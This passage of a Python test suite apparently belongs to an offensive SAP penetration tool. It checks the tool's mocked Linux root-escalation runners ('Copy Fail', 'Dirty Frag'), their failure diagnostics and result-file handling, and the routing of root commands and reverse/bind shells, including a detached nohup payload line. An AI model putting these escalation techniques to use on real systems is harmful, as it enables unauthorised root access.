    via authencesn cipher heuristic, but every exploit attempt
    deterministically returns 'Authentication token manipulation
    error'.  Previously we surfaced 'race lost - retry usually
    works', which sent the operator into pointless retry loops.
    """
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.4.0-150700.53.52-default"

    def _fake_egc(node, prog, params="", long_params=""):
        # Every attempt: same PAM error, no result file.
        if prog == "python3" and params == "/tmp/.cf_s.py":
            return {
                "output": ["Password: su: Authentication token "
                           "manipulation error"],
                "success": True,
            }
        if prog == "base64" and ".cf_result_" in params:
            return {"output": ["No such file or directory"],
                    "success": False}
        if prog == "sudo":
            return {"output": [], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    assert out["ok"] is False
    # Diagnostic must say DETERMINISTIC (uppercase in the message
    # so the operator can't miss it) and explain that retries are
    # useless on this kernel.
    err_low = out["error"].lower()
    assert "deterministic" in err_low, (
        f"All-same-error must produce 'deterministic' diagnostic; "
        f"got: {out['error']!r}")
    # And it should mention silent vendor backport as the likely
    # cause - operator-actionable.
    assert ("silent" in err_low or "backport" in err_low), (
        f"Diagnostic must mention silent/backport as the likely "
        f"cause; got: {out['error']!r}")


def test_copyfail_intermittent_failure_diagnosis():
    """When attempts produce MIXED errors (some PAM auth fail,
    some different), the exploit primitive IS working but the
    race is hard to win - retrying the whole 5-attempt cycle
    might succeed.  Diagnostic must say 'race-based, retry',
    NOT 'deterministic, give up'."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    state = {"call_count": 0}
    def _fake_egc(node, prog, params="", long_params=""):
        if prog == "python3" and params == "/tmp/.cf_s.py":
            state["call_count"] += 1
            # Mix the outputs so the all-same heuristic doesn't fire.
            # Attempts 1, 3, 5: PAM error.
            # Attempts 2, 4: weird unrelated error.
            if state["call_count"] in (1, 3, 5):
                return {
                    "output": ["Password: su: Authentication token "
                               "manipulation error"],
                    "success": True,
                }
            return {"output": ["something else happened"],
                    "success": True}
        if prog == "base64" and ".cf_result_" in params:
            return {"output": ["No such file or directory"],
                    "success": False}
        if prog == "sudo":
            return {"output": [], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    assert out["ok"] is False
    err_low = out["error"].lower()
    # Mixed outcomes -> race-based, not deterministic.  The error
    # must NOT call this deterministic (would be a misdiagnosis).
    assert "deterministic" not in err_low, (
        f"Mixed-outcome attempts must NOT be diagnosed as "
        f"deterministic; got: {out['error']!r}")


def test_copyfail_rejects_sudo_error_text_as_b64():
    """Regression for the S4H 'garbled root output' bug.  When the
    exploit lost the race + the unique RESULT path didn't exist,
    the read-back path was:

      1. `base64 /tmp/.cf_result_<id>` -> stderr 'No such file...'
         (success=False, output captured may include error msg)
      2. fallback: `sudo base64 /tmp/.cf_result_<id>` -> sudo isn't
         NOPASSWD on this SAP user, so sudo prints e.g.
         '[sudo] password for s4hadm:' or
         'sudo: a password is required' to stderr.
      3. The old guard only checked for 'No such file' substring -
         missed the sudo error markers - let the text through.
      4. _b64.b64decode treats the sudo error as base64-encoded
         data -> garbage bytes -> surfaces as the operator's
         'root command output' in the GUI.

    With the hardened guard, _read_b64 must return None in step 2,
    making the runner correctly report failure instead."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    def _fake_egc(node, prog, params="", long_params=""):
        # Exploit script runs - simulate the race-lost exploit_out.
        if prog == "python3" and params == "/tmp/.cf_s.py":
            return {
                "output": ["Password: su: Authentication token "
                            "manipulation error"],
                "success": True,
            }
        # base64 of the unique RESULT path - file doesn't exist.
        if prog == "base64" and ".cf_result_" in params:
            return {
                "output": [f"base64: {params}: No such file or directory"],
                "success": False,
            }
        # sudo fallback - returns the sudo error text the old guard
        # would have mistakenly b64decoded.
        if prog == "sudo" and "base64" in params and ".cf_result_" in params:
            return {
                "output": ["[sudo] password for s4hadm: ",
                          "sudo: a password is required"],
                "success": False,
            }
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    # With the hardened guard, _read_b64 returns None -> ok=False -
    # NOT a fake-success uid=0(root) reading garbage from the sudo
    # error text.
    assert out["ok"] is False, (
        f"Race-lost exploit + sudo-fallback error must surface as "
        f"failure, not as a garbled-bytes 'success'.  got: {out!r}")
    assert "missing after exploit" in out["error"]
    # The actual stdout returned to the caller MUST NOT contain
    # garbage bytes from the b64-decoded sudo error.
    assert not out["stdout"], (
        f"stdout must be empty when the file is missing; got "
        f"{out['stdout']!r}")


def test_copyfail_rejects_random_non_b64_text():
    """Belt and braces: even if the marker list is incomplete, the
    strict base64-alphabet check must catch anything that isn't
    valid base64.  Simulates a fallback returning text with chars
    outside [A-Za-z0-9+/=]."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    def _fake_egc(node, prog, params="", long_params=""):
        if prog == "python3" and params == "/tmp/.cf_s.py":
            return {"output": ["exploit failed silently"], "success": True}
        if prog == "base64" and ".cf_result_" in params:
            # Some weird error containing spaces, dashes, colons -
            # all chars NOT in base64 alphabet, but NOT in our
            # error-marker list either.  Strict-alphabet check
            # must catch this.
            return {
                "output": ["base64: unknown option -- ?",
                          "Try 'base64 --help' for more information."],
                "success": False,
            }
        if prog == "sudo":
            return {"output": ["random-unrecognized-error"], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    assert out["ok"] is False
    assert not out["stdout"]


# test_copyfail_surfaces_auth_token_failure_marker (deleted):
# The original test asserted "race lost" in the failure error,
# but the 5-attempt retry loop + deterministic-vs-intermittent
# diagnostic distinction (added in the S4H follow-up) re-classify
# the "all 5 attempts hit the same PAM error" case as
# DETERMINISTIC, not race-lost.  Coverage is preserved by:
#   * test_copyfail_deterministic_failure_diagnosis (above) -
#     locks the deterministic-fail message path
#   * test_copyfail_intermittent_failure_diagnosis (above) -
#     locks the race-lost-retry message path
# The old single-attempt "race lost" wording is no longer used.


def test_dirtyfrag_uses_unique_result_path_per_run():
    """Mirror of the copyfail fix.  Same sticky-bit issue, same
    unique-RESULT-path solution.  Dirty Frag's binary blob has
    /tmp/.df_run.sh hardcoded at offset 0xa1 so WRAPPER stays
    shared, but the RESULT path is free to vary per run."""
    from sapmap_dirtyfrag import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.dirtyfrag_kernel = "6.18.21"

    gw_calls = []
    def _fake_egc(node, prog, params="", long_params=""):
        gw_calls.append((prog, params, long_params[:200] if long_params else ""))
        if prog in ("base64", "sudo") and ".df_result" in params:
            return {"output": ["No such file or directory"], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_dirtyfrag._load_blob", return_value={
            "hex": "00" * 100, "size": 100, "sha256": "a" * 64}), \
         patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out1 = run_as_root(n, "id")
        out2 = run_as_root(n, "whoami")

    result_paths = set()
    for (prog, params, lp) in gw_calls:
        import re as _re
        for haystack in (params, lp):
            for m in _re.finditer(r"/tmp/\.df_result_[0-9a-f]+", haystack):
                result_paths.add(m.group())

    assert len(result_paths) >= 2, (
        f"Each Dirty Frag run must use a UNIQUE "
        f"/tmp/.df_result_<id> path; found only "
        f"{result_paths!r} across 2 runs.")
    bare = {p for p in result_paths if p == "/tmp/.df_result"}
    assert not bare, (
        f"Found shared /tmp/.df_result path in use - regression: "
        f"{result_paths!r}")


def test_cf_exploit_script_wrapper_writes_command_verbatim():
    """When the generated exploit script runs, it must write the
    EXACT operator command (after our `> /tmp/.cf_result 2>&1`
    redirect) to the wrapper script — no mutation, no double-
    escaping.  Simulate the _wf.write call to verify."""
    payload = "echo 'hello world' && id"
    script = _build_cf_exploit_script(payload)
    # The script has two _wf.write calls — the first writes the
    # `#!/bin/sh\n` shebang, the second writes the operator command.
    # Recover both literals and verify the command line.
    import re
    matches = re.findall(r"_wf\.write\((.+?)\)\n", script)
    assert len(matches) >= 2, (
        f"Expected at least two _wf.write calls; got {len(matches)}")
    shebang_literal = eval(matches[0])
    cmd_literal = eval(matches[1])
    assert shebang_literal == "#!/bin/sh\n"
    # The wrapper script's command line must end with the redirect
    # we appended.
    assert cmd_literal.endswith(" > /tmp/.cf_result 2>&1\n")
    # And the operator's original command must be present verbatim
    # (before the redirect).
    assert payload in cmd_literal


# ===========================================================================
# OS Terminal + Reverse/Bind Shell re-routing through Linux LPE for root
# ===========================================================================
# When the operator picks method="linuxlpe_root" in the OS Command
# Terminal or Reverse/Bind Shell modal, the backend routes the
# command / payload through sapmap_lpe_auto.run_linux_lpe() and adapts
# the {ok, stdout, method, error} return shape to the
# {success, output, error} shape the rest of exec_command /
# shell_start expect.  Mirror of the Windows winlpe_system wiring
# (test_windows_lpe.py:test_run_windows_lpe_result_shape_*).


def test_run_linux_lpe_result_shape_matches_exec_command_adapter():
    """Lock the four-field shape so the OS Terminal's linuxlpe_root
    branch doesn't silently drop a key if run_linux_lpe gains new
    fields later.  Same pattern as the Windows side."""
    from sapmap_lpe_auto import run_linux_lpe
    cf_res = {"vulnerable": True, "kernel": "6.18.21", "reason": "ok"}
    df_res = {"vulnerable": False, "kernel": "6.18.21", "arch": "x86_64",
              "reason": "x", "mitigation_applied": False}

    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res), \
         patch("sapmap_copyfail.run_as_root", return_value={
            "ok": True,
            "stdout": "uid=0(root)\nLine2\nLine3",
            "error": ""}):
        lpe_res = run_linux_lpe(_node(), "id")

    adapted = {
        "success": bool(lpe_res.get("ok")),
        "output": (lpe_res.get("stdout") or "").splitlines(),
        "error": lpe_res.get("error", ""),
        "linuxlpe_method": lpe_res.get("method", ""),
    }
    assert adapted["success"] is True
    assert adapted["output"] == ["uid=0(root)", "Line2", "Line3"]
    assert adapted["error"] == ""
    assert adapted["linuxlpe_method"] == "copyfail"


def test_run_linux_lpe_failure_adapter_preserves_error():
    """When neither Copy Fail nor Dirty Frag is viable, the adapter
    must surface the picker's explanatory error verbatim so the
    operator sees a clear reason in the OS terminal / shell modal."""
    from sapmap_lpe_auto import run_linux_lpe
    cf_res = {"vulnerable": False, "kernel": "6.19.12",
              "reason": "patched kernel 6.19.12 — Copy Fail blocked"}
    df_res = {"vulnerable": False, "kernel": "6.19.12", "arch": "x86_64",
              "reason": "modprobe blacklist applied — Dirty Frag blocked",
              "mitigation_applied": True}

    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res):
        lpe_res = run_linux_lpe(_node(), "id")

    adapted = {
        "success": bool(lpe_res.get("ok")),
        "output": (lpe_res.get("stdout") or "").splitlines(),
        "error": lpe_res.get("error", ""),
        "linuxlpe_method": lpe_res.get("method", ""),
    }
    assert adapted["success"] is False
    # The picker's mitigation-aware summary should be preserved
    # (so the operator sees "both LPE techniques blocked - ...").
    assert ("Dirty Frag" in adapted["error"]
            or "LPE" in adapted["error"])
    assert adapted["linuxlpe_method"] == ""


def test_run_linux_lpe_accepts_fire_and_forget_kwarg():
    """run_linux_lpe must accept the fire_and_forget kwarg for API
    symmetry with sapmap_winlpe_auto.run_windows_lpe.  Currently a
    no-op at the runner level (copyfail/dirtyfrag's subshell-redirect
    wrapper handles detached payloads naturally), but the parameter
    must exist so the shell_start handler can pass it uniformly
    without an OS-specific branch."""
    from sapmap_lpe_auto import run_linux_lpe
    cf_res = {"vulnerable": True, "kernel": "6.18.21", "reason": "ok"}
    df_res = {"vulnerable": False, "kernel": "6.18.21", "arch": "x86_64",
              "reason": "x", "mitigation_applied": False}

    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res), \
         patch("sapmap_copyfail.run_as_root", return_value={
            "ok": True, "stdout": "", "error": ""}):
        # Must not raise TypeError about unknown kwarg
        out = run_linux_lpe(_node(),
                              "(nohup python3 -c '...' "
                              "</dev/null >/dev/null 2>&1 &)",
                              fire_and_forget=True)
    assert out["ok"] is True
    assert out["method"] == "copyfail"


# ===========================================================================
# root dropdown — Linux mirror of the SYSTEM dropdown
# ===========================================================================
# When the operator opens the OS Command Terminal or Reverse/Bind
# Shell modal on a Linux host with a viable LPE technique, the
# method dropdown must offer "🔥 root (via Linux LPE)" gated on
# copyfail_vulnerable || dirtyfrag_vulnerable.  Mirror of the
# Windows tests in test_windows_lpe.py:test_system_badge_*.


def test_root_dropdown_references_copyfail_dirtyfrag_vulnerable_flags():
    """The dropdown gating JS must read BOTH copyfail_vulnerable and
    dirtyfrag_vulnerable so a renamed model field doesn't silently
    leave the option permanently disabled.  Lock both names here."""
    import sapmap_html
    html = sapmap_html.get_html()
    assert "n.copyfail_vulnerable" in html, (
        "Copy Fail vuln flag missing from root-dropdown gating")
    assert "n.dirtyfrag_vulnerable" in html, (
        "Dirty Frag vuln flag missing from root-dropdown gating")


def test_root_dropdown_includes_linuxlpe_root_option():
    """Both the OS Terminal modal and the Reverse/Bind Shell modal
    must offer the linuxlpe_root method value with a recognisable
    label so the operator can pick it.  Static-option + addS/addT
    label both checked."""
    import sapmap_html
    html = sapmap_html.get_html()
    assert "'linuxlpe_root'" in html, (
        "linuxlpe_root method value missing from JS dropdown builder")
    assert "root (via Linux LPE)" in html, (
        "root-via-Linux-LPE label missing from dropdown")
    # The OS Terminal modal also has a static <option> fallback
    # (in case the JS rebuild doesn't fire) - lock the value there.
    assert 'value="linuxlpe_root"' in html, (
        "linuxlpe_root static <option> missing from OS Terminal modal")


def test_root_dropdown_default_select_prefers_linuxlpe_when_available():
    """When a Linux host has a viable LPE technique AND no Windows
    LPE (mutually exclusive in practice), the method dropdown must
    default-select linuxlpe_root so the operator doesn't have to
    drop down and pick it manually - same UX as winlpe_system on
    Windows hosts."""
    import sapmap_html
    html = sapmap_html.get_html()
    # The default-select ternary chain reads:
    #   hasWinLpe   -> 'winlpe_system'
    #   hasLinuxLpe -> 'linuxlpe_root'
    #   hasCve      -> 'cve_31324'
    #   ...
    # Lock the Linux LPE branch existing in BOTH the OS Terminal
    # (hasLinuxLpe) AND Shell modal (hasLinuxLpeS) ternaries.
    assert "hasLinuxLpe" in html, (
        "Linux LPE auto-select branch missing from OS Terminal ternary")
    assert "hasLinuxLpeS" in html, (
        "Linux LPE auto-select branch missing from Shell modal ternary")
